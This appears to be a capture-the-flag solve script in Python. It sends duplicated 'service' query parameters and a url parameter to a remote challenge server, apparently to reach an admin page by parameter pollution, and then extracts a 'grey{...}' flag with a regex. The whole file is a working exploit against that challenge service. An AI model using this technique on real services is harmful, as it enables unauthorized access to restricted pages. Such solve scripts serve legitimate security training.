import re
from requests import Session

BASE_URL = 'http://34.124.157.94:5004/'
# BASE_URL = 'http://localhost:5004/'
FLAG_FORMAT = re.compile(r'grey{.*}')

with Session() as s:
    response = s.get(
        f"{BASE_URL}/?service=admin_page&service=home_page&url=http://home_page",
    )
    content = response.content.decode()
    result = FLAG_FORMAT.search(content)
    print(f"Flag: {result.group(0)}")
